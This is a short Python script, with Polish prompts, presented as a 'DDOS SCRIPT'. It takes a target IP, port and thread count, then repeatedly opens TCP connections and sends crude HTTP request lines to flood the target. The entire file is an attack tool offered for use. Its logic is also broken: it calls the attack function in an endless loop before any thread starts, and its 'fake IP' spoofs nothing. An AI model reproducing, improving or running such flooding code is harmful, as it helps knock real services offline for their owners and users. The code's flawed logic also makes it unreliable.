import threading
import socket
from pyfiglet import Figlet
from colorama import *

f = Figlet(font='slant')
print(Fore.MAGENTA + f.renderText('DDOS SCRIPT'))

target = input('Podaj ip: ')
port = int(input('Podaj port: '))
fake_ip = input('Podaj sztuczne ip: ')
threads = int(input('Podaj ilość ataków: '))

def ddos():
    while True:
        ### atak na TCP ###
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(('GET /' + target + ' HTTP/1.1\r\n').encode('ascii'), (target, port)) ### wysylanie zapytan
        s.sendto(('HOST /' + fake_ip + ' \r\n\r\n').encode('ascii'), (target, port))   ### wysylanie zapytan
        s.close()

for i in range(threads):
    ddos()
    thread = threading.Thread(target=ddos)
    thread.start()